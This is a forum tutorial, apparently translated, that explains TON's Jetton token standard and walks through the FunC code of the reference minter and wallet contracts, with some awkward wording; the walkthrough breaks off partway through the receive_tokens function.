[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 1:49pm  1

## [](#foreword-why-tokens-and-standards-are-needed-1)Foreword - why tokens and standards are needed

#### [](#what-is-a-token-2)What is a token

A token is a unit of account for some digital asset in some network. It is important to note that a token does not usually mean a cryptocurrency, but a record distributed on a blockchain that is managed using smart contracts. The smart contract contains the values of balances on the accounts of token holders, and the smart contract also provides the ability to transfer tokens from one account to another.

#### [](#what-is-a-fungible-and-nonfungible-token-3)What is a fungible and nonfungible token?

One of the possible classifications of tokens is the classification by fungibility.

**Fungible Tokens** are assets that are not unique and can be easily exchanged for another asset of the same type. Such tokens are made in such a way that each token is equivalent to the next token.

**Non-fungible tokens** are assets, each instance of which is unique (specific) and cannot be replaced by another similar asset. A non-fungible token is some kind of digital object certificate with the ability to transfer the certificate through some mechanism.

#### [](#why-do-we-need-a-token-standard-and-what-is-it-4)Why do we need a token standard and what is it

In order for tokens to be used in other applications (from wallets to decentralized exchanges), smart contract interface standards for tokens are being introduced.

> In this case, the interface is the signature (syntactic construction of the function declaration) of functions without the implementation of the function itself.

#### [](#where-does-the-approval-of-the-standard-take-place-5)Where does the “approval” of the standard take place

Blockchains usually have separate pages on github or on a platform with the necessary mechanics, where you can make proposals on standards.

In TON, this is [github repository](https://github.com/ton-blockchain/TIPs).

> Important, these pages are not a forum or a place for free discussion of the blockchain, so be responsible for your posts if you want to suggest something in this repository.

#### [](#what-risks-arise-from-the-nature-of-the-token-6)What risks arise from the nature of the token

Since tokens are actually smart contracts, they, despite their effectiveness, have certain risks. For example, there may be a bug in the smart contract code, or the smart contract itself may be written in such a way that fraudsters can steal funds from token holders. Therefore, it is desirable to study the smart contracts of tokens.

## [](#what-is-the-jetton-standard-in-ton-7)What is the Jetton standard in TON

The standard for a fungible token in TON is Jetton, the description of the standard is [here](https://github.com/ton-blockchain/TIPs/issues/74). The Jetton standard token should consist of two types of smart contracts:

*   master contract
*   contract wallet

Each Jetton has a main smart contract (let’s call it a master contract) that is used to mint new Jettons, account for the total supply, and provide general information about the token.

Information about the number of tokens owned by each user is stored in smart contracts called the Jetton wallet.

There is a good example in the standard documentation:

If you release Jetton with a supply of 200 Jettons owned by 3 people, then you need to deploy 4 contracts: 1 Jetton-master and 3 jetton-wallets.

#### [](#contract-functionality-in-jetton-8)Contract functionality in Jetton

The master contract is required by the standard to implement two Get methods:

*   get\_jetton\_data() - returns:
    *   `total_supply` - (integer) - total number of issued Jetton tokens
    *   `mintable` - (-1/0) - flag indicating whether the number of tokens can increase
    *   `admin_address` - (MsgAddressInt) - address of the smart contract that manages Jetton (contract master)
    *   `jetton_content` - cell - data according to [token standard](https://github.com/ton-blockchain/TIPs/issues/64)
    *   `jetton_wallet_code` - cell - wallet code for this token
    *   get\_wallet\_address(slice owner\_address) - Returns the Jetton wallet address for this owner address.

According to the standard, the wallet contract must implement:

*   internal message handlers:
*   token transfers
*   burning tokens
*   Get method `get_wallet_data()` which returns:  
    `balance` - (uint256) number of Jetton tokens in the wallet.  
    `owner` - (MsgAddress) wallet owner address;  
    `jetton` - (MsgAddress) Jetton master address;  
    `jetton_wallet_code` - (cell) cell with this wallet code;

> The question may arise why we need the wallet code, the wallet code will allow you to reproduce the address of the wallet smart contract, how it works will be discussed below.

> Important: the standard also describes many nuances regarding commissions, restrictions, and other things, but we will not dwell on this in too much detail so that the lesson does not turn into a book.

#### [](#scheme-of-work-9)Scheme of work

Next, we will talk about the [example](https://github.com/ton-blockchain/token-contract) implementation of Jetton from the standard. Of course, this is not the only possible implementation of Jetton, but it will allow you not to parse everything at the abstraction level.

For the convenience of discussing the code, let’s talk about how Jetton works functionally, i.e. how is the transfer of tokens, minting, etc.

The [example](https://github.com/ton-blockchain/token-contract/tree/main/ft) has the following files:

*   two examples of a master contract: jetton-minter.fc, jetton-minter-ICO.fc
*   contract wallet jetton-wallet.fc
*   other auxiliary files.

Next, using the jetton-minter.fc master contract and the jetton-wallet.fc wallet contract as an example, we will consider the functionality.

##### [](#chasing-10)Chasing

Mining in jetton-minter.fc is as follows, the owner of the master contract sends a message with `op::mint()`, where the message body contains information on which wallet to send Jetton standard tokens to. Further, the message sends information to the smart contract wallet.

##### [](#burning-coins-11)Burning coins

The wallet owner sends a message with `op::burn()` and the wallet smart contract reduces the number of tokens according to the message and sends a notification (`op::burn_notification()`) to the master contract that the supply of tokens has decreased.

##### [](#transfer-of-coins-transfer-sendreceive-12)Transfer of coins (Transfer - send/receive)

The transfer of tokens is divided into two parts:

*   `op::transfer()` outgoing transfer
*   `op::internal_transfer()` incoming transfer

An outgoing transfer starts with a message with `op::transfer()` from the owner of the smart contract wallet and sends tokens to another smart contract wallet (and of course, a decrease in your token balance).

An incoming transfer after a message with `op::internal_transfer()` changes the balance and sends a message with `op::transfer_notification()` - a notification message about the transfer.

And yes, when you send Jetton tokens to an address, you can request that the wallet associated with that address notify the address when the tokens arrive.

## [](#analyzing-the-code-13)Analyzing the code

Before analyzing the code, I will note that in general the “mechanics” are repeated, so the further into the analysis, the more top-level the analysis will be.

We will parse files from the [repository](https://github.com/ton-blockchain/token-contract/tree/main/ft) in the following order:

*   jetton-minter.fc
*   jetton-wallet.fc
*   jetton-minter-ICO.fc

And the rest of the files (jetton-utils.fc, op-codes.fc, params.fc) will be analyzed in parallel with the first three, since they are “service”.

## [](#jetton-minterfc-14)jetton-minter.fc

The master contract starts with two helper functions, for loading and unloading data.

##### [](#loading-and-unloading-data-from-c4-15)Loading and unloading data from c4

Now let’s look at two helper functions that will load and unload data from register c4. The “master contract repository” will store:

*   total\_supply - the total “stock” of the token
*   admin\_address - address of the smart contract that manages Jetton
*   content - cell according to [standard](https://github.com/ton-blockchain/TIPs/issues/64)
*   jetton\_wallet\_code wallet code for this token

In order to “get” the data from c4, we need two functions from the FunC standard library.

Namely: `get_data` - takes a cell from the c4 register. `begin_parse` - converts a cell into a slice

```
	(int, slice, cell, cell) load_data() inline {
	  slice ds = get_data().begin_parse();
	  return (
		  ds~load_coins(), ;; total_supply
		  ds~load_msg_addr(), ;; admin_address
		  ds~load_ref(), ;; content
		  ds~load_ref()  ;; jetton_wallet_code
	  );
	}
```

With the help of the `load_` functions already familiar to us, we unload the data from the slice and return it.  
In order to save data, we need to do three things:

*   create a Builder for the future cell
*   write a value to it
*   from Builder create Cell (cell)
*   Write the resulting cell to the register

We will do this again with the help of [FunC standard library functions](https://docs.ton.org/develop/func/stdlib/).

`begin_cell()` - create a Builder for the future cell `end_cell()` - create a Cell (cell) `set_data()` - write the cell to register c4

```
() save_data(int total_supply, slice admin_address, cell content, cell jetton_wallet_code) impure inline {
  set_data(begin_cell()
			.store_coins(total_supply)
			.store_slice(admin_address)
			.store_ref(content)
			.store_ref(jetton_wallet_code)
		   .end_cell()
		  );
}
```

With the help of the `store_` functions already familiar to us, we will store data.

##### [](#auxiliary-minting-function-16)Auxiliary minting function

Further down the [code](https://github.com/ton-blockchain/token-contract/blob/main/ft/jetton-minter.fc) is an minting function for minting tokens.

```
() mint_tokens(slice to_address, cell jetton_wallet_code, int amount, cell master_msg) impure {

}
```

It measures parameters:

*   slice to\_address - address to which tokens should be sent
*   cell jetton\_wallet\_code - wallet code for this token
*   int amount - number of tokens
*   cell master\_msg - message from contract master

And here the next question arises, we have some address, but this is not the address of the wallet of the token, how then to get the address of the smart contract of the wallet with tokens (tokens)?

There is a little trick here. If we study [documentation](https://ton-blockchain.github.io/docs/#/howto/step-by-step?id=_3-compiling-a-new-smart-contract) how a smart contract is compiled.

We see the following:

The code and data for the new smart contract are concatenated into a StateInit structure (on the next line), the address of the new smart contract (equal to the hash of this StateInit structure) is computed and output, and then externally communicated to the appropriate destination address of the new smart contract. Externally, this message contains both the correct StateInit for the new smart contract and a non-trivial payload (signed privately with the private key).

For us, this means that we get the address of the smart contract of the token from the address to which we need to send the tokens. If we talk about pregnancy, we use the address, the wallet code, we will collect the StateInit of the wallet.

This is possible, since the [hashing](https://en.wikipedia.org/wiki/Hash_function) function are deterministic, which means that there will be a different hash for different inputs, at the same time, for the same input data, the hash function will always return a uniform hash.

For this, the jetton-utils.fc file has two functions `calculate_jetton_wallet_state_init` and `calculate_jetton_wallet_address`

```
 cell calculate_jetton_wallet_state_init(slice owner_address, slice jetton_master_address, cell jetton_wallet_code) inline {
  return begin_cell()
		  .store_uint(0, 2)
		  .store_dict(jetton_wallet_code)
		  .store_dict(pack_jetton_wallet_data(0, owner_address, jetton_master_address, jetton_wallet_code))
		  .store_uint(0, 1)
		 .end_cell();
}

slice calculate_jetton_wallet_address(cell state_init) inline {
  return begin_cell().store_uint(4, 3)
					 .store_int(workchain(), 8)
					 .store_uint(cell_hash(state_init), 256)
					 .end_cell()
					 .begin_parse();
}
```

The function `calculate_jetton_wallet_state_init` collects StateInit according to the [token standard](https://github.com/ton-blockchain/TIPs/issues/64) with zero balance.

The `calculate_jetton_wallet_address` function collects the address according to the [TL-B scheme](https://github.com/ton-blockchain/ton/blob/master/crypto/block/block.tlb#L99).

> the `cell_hash()` function is used to calculate the hash - it calculates the hash of the cell representation.

So the minting function now looks like this:

```
() mint_tokens(slice to_address, cell jetton_wallet_code, int amount, cell master_msg) impure {
  cell state_init = calculate_jetton_wallet_state_init(to_address, my_address(), jetton_wallet_code);
  slice to_wallet_address = calculate_jetton_wallet_address(state_init);

}
```

Next, you need to send a message to the smart contract:

```
  var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(to_wallet_address)
	.store_coins(amount)
	.store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
	.store_ref(state_init)
	.store_ref(master_msg);
```

It is well written about sending messages [here](https://ton-blockchain.github.io/docs/#/smart-contracts/messages), as well as in the third lesson. Using `store_ref` we send a message with information for the wallet contract.

It remains only to send a message, for this we use `send_raw_message` from the [standard library](https://docs.ton.org/develop/func/stdlib/#send_raw_message).

We have already collected the msg variable, it remains to figure out `mode`. Each mode is described in [documentation](https://docs.ton.org/develop/func/stdlib/#send_raw_message). Let’s look at an example to make it clearer.

Let there be 100 coins on the balance of the smart contract, and we receive an internal message with 60 coins and send a message with 10, the total fee is 3.

`mode = 0` - balance (100+60-10 = 150 coins), send(10-3 = 7 coins)  
`mode = 1` - balance (100+60-10-3 = 147 coins), send(10 coins)  
`mode = 64` - balance (100-10 = 90 coins), send (60+10-3 = 67 coins)  
`mode = 65` - balance (100-10-3=87 coins), send (60+10 = 70 coins)  
`mode = 128` -balance (0 coins), send (100+60-3 = 157 coins)

In the contract code, we have mode 1 which is mode’ = mode + 1, which means that the sender wants to pay the transfer fee separately

```
send_raw_message(msg.end_cell(), 1); ;; pay transfer fees separately, revert on errors
```

The final code of the `mint_tokens()` function:

```
() mint_tokens(slice to_address, cell jetton_wallet_code, int amount, cell master_msg) impure {
  cell state_init = calculate_jetton_wallet_state_init(to_address, my_address(), jetton_wallet_code);
  slice to_wallet_address = calculate_jetton_wallet_address(state_init);
  var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(to_wallet_address)
	.store_coins(amount)
	.store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
	.store_ref(state_init)
	.store_ref(master_msg);
  send_raw_message(msg.end_cell(), 1); ;; pay transfer fees separately, revert on errors
}
```

#### [](#analyzing-recv_internal-17)Analyzing recv\_internal()

Let me remind you that smart contracts in the TON network have two reserved methods that can be accessed.

First, `recv_external()` this function is executed when a request to the contract comes from the outside world, that is, not from TON, for example, when we form a message ourselves and send it via lite-client (About installing \[lite-client\](https:/ /ton.org/docs/#/compile?id=lite-client)).  
Second, `recv_internal()` this function is executed when inside TON itself, for example, when any contract refers to ours.

In our case, `recv_internal()` will take the following arguments:

```
() recv_internal(int msg_value, cell in_msg_full, slice in_msg_body) impure {

}
```

> `impure` is a keyword that indicates that the function changes the smart contract data. For example, we must specify the `impure` specifier if the function can modify the contract store, send messages, or throw an exception when some data is invalid and the function is intended to validate that data. Important: If impure is not specified and the result of a function call is not used, then the FunC compiler may remove that function call.

Now let’s look at the code for this function. At the very beginning there is a check whether the message is empty.

```
if (in_msg_body.slice_empty?()) { ;; ignore empty messages
    return ();
}
```

Next, we begin to parse (read out) the message:

```
slice cs = in_msg_full.begin_parse();
```

We take out the flags and check that the message was not returned (here we mean bounced).

```
if (flags & 1) { ;; ignore all bounced messages
    return ();
}
```

We get the address of the sender of the message on `recv_internal()`:

```
slice sender_address = cs~load_msg_addr();
```

Now `op` and `query_id` are next in line, you can read about them either in guides on contracts, or in the fifth lesson. In short, `op` operation identification is next.

```
int op = in_msg_body~load_uint(32);
int query_id = in_msg_body~load_uint(64);
```

Next, we will use the helper function that we wrote earlier - `load_data()`.

```
(int total_supply, slice admin_address, cell content, cell jetton_wallet_code) = load_data();
```

Now, using conditional operators, let’s build logic around `op`. For convenience, the codes are stored in a separate file `op-codes.fc`. And also at the end there is an exception, i.e. if the contract does not perform some action in accordance with `op`, there will be an exception.

> Important: given that the token must comply with the standard, then for the operations that are described in the standard, you need to take the appropriate codes, for example, for `burn_notification()` this is 0x7bdd97de.

We get:

```
() recv_internal(int msg_value, cell in_msg_full, slice in_msg_body) impure {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}
	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	int op = in_msg_body~load_uint(32);
	int query_id = in_msg_body~load_uint(64);

	(int total_supply, slice admin_address, cell content, cell jetton_wallet_code) = load_data();

	if (op == op::mint()) {
		;; token minting
	}

	if (op == op::burn_notification()) {
		;;  processing a message from the wallet that the tokens have burned down
	}

	if (op == 3) { ;; change admin
		;; change of "admin" or how else can you call the owner of the contract
	}

	if (op == 4) { ;; change content, delete this for immutable tokens
		;; change of data in c4 register
	}

	throw(0xffff);
}
```

##### [](#opmint-18)op::mint()

The first thing we do with `op::mint()` is raise an exception if the address of the administrator (owner) of the contract is equal to the address of the sender:

```
if (op == op::mint()) {
    throw_unless(73, equal_slices(sender_address, admin_address));

}
```

Next, we get the address from the message body to which tokens should be sent, the number of TONs for “transporting” Jetton standard tokens, and the master contract message.

```
if (op == op::mint()) {
    throw_unless(73, equal_slices(sender_address, admin_address));
	slice to_address = in_msg_body~load_msg_addr();
    int amount = in_msg_body~load_coins();
    cell master_msg = in_msg_body~load_ref();
}
```

We get the number of tokens from the master contract message, omitting `op` and `query_id`.

```
if (op == op::mint()) {
    throw_unless(73, equal_slices(sender_address, admin_address));
    slice to_address = in_msg_body~load_msg_addr();
    int amount = in_msg_body~load_coins();
    cell master_msg = in_msg_body~load_ref();
    slice master_msg_cs = master_msg.begin_parse();
    master_msg_cs~skip_bits(32 + 64); ;; op + query_id
    int jetton_amount = master_msg_cs~load_coins();
}
```

We call the `mint_tokens()` function that we wrote earlier, and also save the data to `c4` using the `save_data()` helper function. At the end, we will complete the function, the `return` operator will help us. We get:

```
if (op == op::mint()) {
    throw_unless(73, equal_slices(sender_address, admin_address));
    slice to_address = in_msg_body~load_msg_addr();
    int amount = in_msg_body~load_coins();
    cell master_msg = in_msg_body~load_ref();
    slice master_msg_cs = master_msg.begin_parse();
    master_msg_cs~skip_bits(32 + 64); ;; op + query_id
    int jetton_amount = master_msg_cs~load_coins();
    mint_tokens(to_address, jetton_wallet_code, amount, master_msg);
    save_data(total_supply + jetton_amount, admin_address, content, jetton_wallet_code);
    return ();
}
```

##### [](#opburn_notification-19)op::burn\_notification()

The first thing we do with `op::burn_notification()` is get the number of tokens and the address from which the notification came from the message body.

```
if (op == op::burn_notification()) {
    int jetton_amount = in_msg_body~load_coins();
    slice from_address = in_msg_body~load_msg_addr();

}
```

Next, using the familiar trick to “recreate” the wallet address (the `calculate_user_jetton_wallet_address()` function), we will throw an exception if the sender address (`sender_address`) is not equal to the wallet address.

```
if (op == op::burn_notification()) {
    int jetton_amount = in_msg_body~load_coins();
    slice from_address = in_msg_body~load_msg_addr();
    throw_unless(74,
        equal_slices(calculate_user_jetton_wallet_address(from_address, my_address(), jetton_wallet_code), sender_address)
    );

}
```

Now let’s store the data in c4, while reducing the total supply of tokens by the amount of burned tokens.

```
if (op == op::burn_notification()) {
    int jetton_amount = in_msg_body~load_coins();
    slice from_address = in_msg_body~load_msg_addr();
    throw_unless(74,
        equal_slices(calculate_user_jetton_wallet_address(from_address, my_address(), jetton_wallet_code), sender_address)
    );
	save_data(total_supply - jetton_amount, admin_address, content, jetton_wallet_code);
}
```

After we get the address to which we need to return the answer.

```
if (op == op::burn_notification()) {
    int jetton_amount = in_msg_body~load_coins();
    slice from_address = in_msg_body~load_msg_addr();
    throw_unless(74,
        equal_slices(calculate_user_jetton_wallet_address(from_address, my_address(), jetton_wallet_code), sender_address)
    );
	save_data(total_supply - jetton_amount, admin_address, content, jetton_wallet_code);
	slice response_address = in_msg_body~load_msg_addr();
}
```

And if it’s not “null” (not `addr_none`), we send a message about the excess (`op::excesses()`) and, of course, terminate the function using the `return` operator.

```
if (op == op::burn_notification()) {
    int jetton_amount = in_msg_body~load_coins();
    slice from_address = in_msg_body~load_msg_addr();
    throw_unless(74,
        equal_slices(calculate_user_jetton_wallet_address(from_address, my_address(), jetton_wallet_code), sender_address)
    );
    save_data(total_supply - jetton_amount, admin_address, content, jetton_wallet_code);
    slice response_address = in_msg_body~load_msg_addr();
    if (response_address.preload_uint(2) != 0) {
      var msg = begin_cell()
        .store_uint(0x10, 6) ;; nobounce - int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 011000
        .store_slice(response_address)
        .store_coins(0)
        .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
        .store_uint(op::excesses(), 32)
        .store_uint(query_id, 64);
      send_raw_message(msg.end_cell(), 2 + 64);
    }
    return ();
}
```

##### [](#op-3-and-op-4-20)op 3 and op 4

In the master contract example, two optional features are also shown, namely changing the owner (admin) of the master contract (`op == 3`), as well as replacing all content in the `c4` register (`op == 4`).

> It is important to note that before interacting with any contracts, it is worth studying their code, as developers often leave loopholes that, for example, can completely change the entire logic of the contract.

In each such “control data contract” `op` it is mandatory to check that the sender address is the address of the contract admin. And then the data is simply saved.

```
if (op == 3) { ;; change admin
    throw_unless(73, equal_slices(sender_address, admin_address));
    slice new_admin_address = in_msg_body~load_msg_addr();
    save_data(total_supply, new_admin_address, content, jetton_wallet_code);
    return ();
}

if (op == 4) { ;; change content, delete this for immutable tokens
    throw_unless(73, equal_slices(sender_address, admin_address));
    save_data(total_supply, admin_address, in_msg_body~load_ref(), jetton_wallet_code);
    return ();
}
```

#### [](#get-methods-21)Get methods

So, according to the Jetton standard, the master contract must have two Get methods:

*   get\_jetton\_data() - which will return data about the Jetton standard token
*   get\_wallet\_address() - which returns by address, wallet smart contract address

##### [](#get_jetton_data-22)get\_jetton\_data()

The function takes data from `c4` and returns:

*   total\_supply - (integer) - total number of issued tokens
*   mintable - (-1/0) - flag indicating whether the number of tokens can increase
*   admin\_address - (MsgAddressInt) - address of the smart contract that manages Jetton
*   jetton\_content - cell - data according to [Token Data Standard](https://github.com/ton-blockchain/TIPs/issues/64)
*   jetton\_wallet\_code - cell - wallet code for this token

The code:

```
(int, int, slice, cell, cell) get_jetton_data() method_id {
	(int total_supply, slice admin_address, cell content, cell jetton_wallet_code) = load_data();
	return (total_supply, -1, admin_address, content, jetton_wallet_code);
}
```

##### [](#get_wallet_address-23)get\_wallet\_address()

Using the auxiliary function, we “reproduce” the address of the smart contract of the wallet.

The code:

```
slice get_wallet_address(slice owner_address) method_id {
	(int total_supply, slice admin_address, cell content, cell jetton_wallet_code) = load_data();
	return calculate_user_jetton_wallet_address(owner_address, my_address(), jetton_wallet_code);
}
```

## [](#jetton-walletfc-24)jetton-wallet.fc

This file starts with two functions that we will define as a low-level TVM primitive using the `asm` keyword.

```
int min_tons_for_storage() asm "10000000 PUSHINT"; ;; 0.01 TON
int gas_consumption() asm "10000000 PUSHINT"; ;; 0.01 TON
```

We will need both functions in order to check gas limits and the minimum number of TONs.

> PUSHINT pushes an Integer onto the stack

##### [](#loading-and-unloading-data-from-c4-25)Loading and unloading data from c4

Now let’s look at two helper functions that will load and unload data from register c4. In our “storage” we will store:

*   int balance - token balance
*   slice owner\_address - token owner address
*   slice jetton\_master\_address - address of the master contract for this token
*   cell jetton\_wallet\_code - wallet code for this token

In order to “get” data from c4, we need two functions from the FunC standard library.

Namely: `get_data` - takes a cell from the c4 register. `begin_parse` - converts a cell into a slice

```
	(int, slice, slice, cell) load_data() inline {
	  slice ds = get_data().begin_parse();
	  return (ds~load_coins(), ds~load_msg_addr(), ds~load_msg_addr(), ds~load_ref());
	}
```

With the help of the `load_` functions already familiar to us, we unload data from slice and return it.

To save the data, `set_data()` is used - it will write the cell to register c4.

```
() save_data (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) impure inline {
  set_data(pack_jetton_wallet_data(balance, owner_address, jetton_master_address, jetton_wallet_code));
}
```

We will collect the data cell itself using the `pack_jetton_wallet_data()` auxiliary function from the jetton-utils.fc file.

`pack_jetton_wallet_data()` function code:

```
cell pack_jetton_wallet_data(int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) inline {
   return  begin_cell()
			.store_coins(balance)
			.store_slice(owner_address)
			.store_slice(jetton_master_address)
			.store_ref(jetton_wallet_code)
		   .end_cell();
}
```

`begin_cell()` - create a Builder for the future cell `store_` - write the values `end_cell()` - create a Cell (cell)

##### [](#function-to-send-tokens-outgoing-transfer-26)Function to send tokens (outgoing transfer)

The function of sending tokens, checks the conditions in accordance with the [standard](https://github.com/ton-blockchain/TIPs/issues/74) and sends the corresponding message.

```
() send_tokens (slice in_msg_body, slice sender_address, int msg_value, int fwd_fee) impure {
}
```

Let’s go through the function code. The function code starts by reading data from `in_msg_body`

```
  int query_id = in_msg_body~load_uint(64);
  int jetton_amount = in_msg_body~load_coins();
  slice to_owner_address = in_msg_body~load_msg_addr();
```

*   query\_id - arbitrary query number
*   int jetton\_amount - number of tokens
*   to\_owner\_address - address of the owner, needed to reproduce the address of the smart contract

Next comes the call to the `force_chain()` function from the params.fc file.

```
force_chain(to_owner_address);
```

The `force_chain` function checks that the address is in workchain number 0 (the base workchain). You can read more about addresses and numbers [here](https://github.com/ton-blockchain/ton/blob/master/doc/LiteClient-HOWTO) at the very beginning. Let’s analyze the code from params.fc:

```
int workchain() asm "0 PUSHINT";

() force_chain(slice addr) impure {
  (int wc, _) = parse_std_addr(addr);
  throw_unless(333, wc == workchain());
}
```

We define the `workchain()` helper function as a low-level TVM primitive using the `asm` keyword. Integer == 0 we need for comparison.

```
int workchain() asm "0 PUSHINT";
```

To extract the information we need from the address, `parse_std_addr()` is used. `parse_std_addr()` - returns the workchain and 256-bit integer address from `MsgAddressInt`.

```
() force_chain(slice addr) impure {
  (int wc, _) = parse_std_addr(addr);
  throw_unless(333, wc == workchain());
}
```

And to raise an exception if the workchains are not equal, we will use `throw_unless()`.

Going back to our `send_tokens()` function

Load data from c4:

```
(int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
```

And immediately subtract from the balance, the number of tokens (jetton\_amount), and immediately check (give exceptions) that the balance has not become less than zero, and the addresses do not match.

```
balance -= jetton_amount;
throw_unless(705, equal_slices(owner_address, sender_address));
throw_unless(706, balance >= 0);
```

Now, using the trick already familiar to us on the master contract, the wallet address is “reproduced”:

```
  cell state_init = calculate_jetton_wallet_state_init(to_owner_address, jetton_master_address, jetton_wallet_code);
  slice to_wallet_address = calculate_jetton_wallet_address(state_init);
```

Next, we get from the message body we get the address to which the response will need to be sent, a custom payload (perhaps someone wants to transfer some more information with the token), as well as the number of nanoTons that will be sent to the destination address.

```
  slice response_address = in_msg_body~load_msg_addr();
  cell custom_payload = in_msg_body~load_dict();
  int forward_ton_amount = in_msg_body~load_coins();
```

Now using the `slice_bits` function, which returns the number of data bits in slice. Let’s check that only another payload remains in the body of the message, and unload it at the same time.

```
  throw_unless(708, slice_bits(in_msg_body) >= 1);
  slice either_forward_payload = in_msg_body
```

Next, a message is collected (let me remind you that `to_wallet_address` is the address of the wallet smart contract):

```
  var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(to_wallet_address)
	.store_coins(0)
	.store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
	.store_ref(state_init);
```

The body of the message is collected separately according to the [standard](https://github.com/ton-blockchain/TIPs/issues/74). Namely:

> Sending tokens is related to transfer, so we collect the body exactly in accordance with transfer

`op` - take from the jetton-utils.fc file (according to the standard, this is internal\_transfer(), which means 0x178d4519)  
`query_id` - arbitrary query number.  
`jetton amount` - the number of transferred tokens in units of this token.  
`owner_address` is the address of the new token owner.  
`response_address` - the address where to send a response with a confirmation of a successful transfer and the rest of the incoming message with a Tone.  
`forward_ton_amount` - the amount of nanoTons to be sent to the destination address.  
`forward_payload` - optional user data to be sent to the destination address.

Message body code and adding it to the message:

```
  var msg_body = begin_cell()
	.store_uint(op::internal_transfer(), 32)
	.store_uint(query_id, 64)
	.store_coins(jetton_amount)
	.store_slice(owner_address)
	.store_slice(response_address)
	.store_coins(forward_ton_amount)
	.store_slice(either_forward_payload)
	.end_cell();
msg = msg.store_ref(msg_body);
```

> The attentive reader may ask where `custom_payload` is, but this field is optional.

And everything seems to be ready for sending, but two important conditions from the standard remain, namely:

*   not enough TON to process the operation, deploy the beneficiary’s Wallet Token and send forward\_ton\_amount.
    
*   After processing the request, the recipient wallet token must send at least in\_msg\_value - forward\_amount - 2 \* max\_tx\_gas\_price to the response\_destination address.
    
    int fwd_count = forward\_ton\_amount ? 2 : 1;  
    throw\_unless(709, msg\_value >  
    forward\_ton\_amount +  
    ;; 3 messages: wal1->wal2, wal2->owner, wal2->response  
    ;; but last one is optional (it is ok if it fails)  
    fwd\_count \* fwd_fee +  
    (2 \* gas\_consumption() + min\_tons\_for\_storage()));  
    ;; universal message send fee calculation may be activated here  
    ;; by using this instead of fwd\_fee  
    ;; msg\_fwd\_fee(to\_wallet, msg\_body, state\_init, 15)
    

> I won’t go into detail here, as the comments and description in the token standard give a detailed picture

It remains only to send a message and save the data in the `c4` register:

```
  send_raw_message(msg.end_cell(), 64); ;; revert on errors
  save_data(balance, owner_address, jetton_master_address, jetton_wallet_code);
```

Final code:

```
() send_tokens (slice in_msg_body, slice sender_address, int msg_value, int fwd_fee) impure {
  int query_id = in_msg_body~load_uint(64);
  int jetton_amount = in_msg_body~load_coins();
  slice to_owner_address = in_msg_body~load_msg_addr();
  force_chain(to_owner_address);
  (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
  balance -= jetton_amount;

  throw_unless(705, equal_slices(owner_address, sender_address));
  throw_unless(706, balance >= 0);

  cell state_init = calculate_jetton_wallet_state_init(to_owner_address, jetton_master_address, jetton_wallet_code);
  slice to_wallet_address = calculate_jetton_wallet_address(state_init);
  slice response_address = in_msg_body~load_msg_addr();
  cell custom_payload = in_msg_body~load_dict();
  int forward_ton_amount = in_msg_body~load_coins();
  throw_unless(708, slice_bits(in_msg_body) >= 1);
  slice either_forward_payload = in_msg_body;
  var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(to_wallet_address)
	.store_coins(0)
	.store_uint(4 + 2 + 1, 1 + 4 + 4 + 64 + 32 + 1 + 1 + 1)
	.store_ref(state_init);
  var msg_body = begin_cell()
	.store_uint(op::internal_transfer(), 32)
	.store_uint(query_id, 64)
	.store_coins(jetton_amount)
	.store_slice(owner_address)
	.store_slice(response_address)
	.store_coins(forward_ton_amount)
	.store_slice(either_forward_payload)
	.end_cell();

  msg = msg.store_ref(msg_body);
  int fwd_count = forward_ton_amount ? 2 : 1;
  throw_unless(709, msg_value >
					 forward_ton_amount +
					 ;; 3 messages: wal1->wal2,  wal2->owner, wal2->response
					 ;; but last one is optional (it is ok if it fails)
					 fwd_count * fwd_fee +
					 (2 * gas_consumption() + min_tons_for_storage()));
					 ;; universal message send fee calculation may be activated here
					 ;; by using this instead of fwd_fee
					 ;; msg_fwd_fee(to_wallet, msg_body, state_init, 15)

  send_raw_message(msg.end_cell(), 64); ;; revert on errors
  save_data(balance, owner_address, jetton_master_address, jetton_wallet_code);
}
```

##### [](#function-to-receive-tokens-incoming-transfer-27)Function to receive tokens (incoming transfer)

Let’s move on to getting tokens:

```
() receive_tokens (slice in_msg_body, slice sender_address, int my_ton_balance, int fwd_fee, int msg_value) impure {

}
```

The `receive_tokens()` function starts by unloading data from c4, then we get `query_id`, `jetton_amount` from the message body:

```
  (int balance, slice owner_address, slice jetton_master_address, cell jetton_wallet_code) = load_data();
  int query_id = in_msg_body~load_uint(64);
  int jetton_amount = in_msg_body~load_coins();
```

Since the wallet has received tokens, you need to add them to the balance:

```
  balance += jetton_amount;
```

We continue to read data from `in_msg_body`, take two addresses: the address from which the tokens were received and the address to which the response should be returned.

```
  slice from_address = in_msg_body~load_msg_addr();
  slice response_address = in_msg_body~load_msg_addr();
```

Next, using the [binary OR operator](https://en.wikipedia.org/wiki/Binary_operation) we check two conditions at once at the addresses:

```
  throw_unless(707,
	  equal_slices(jetton_master_address, sender_address)
	  |
	  equal_slices(calculate_user_jetton_wallet_address(from_address, jetton_master_address, jetton_wallet_code), sender_address)
```

Also, `forward_ton_amount` is taken from the body of the message - the amount of nanoTons that will be sent to the destination address.

```
int forward_ton_amount = in_msg_body~load_coins();
```

And here we finally need the functions that we defined at the very beginning for the gas limit and the minimum number of TON, namely `min_tons_for_storage()` and `gas_consumption()`.

```
  int storage_fee = min_tons_for_storage() - min(ton_balance_before_msg, min_tons_for_storage());
  msg_value -= (storage_fee + gas_consumption());
```

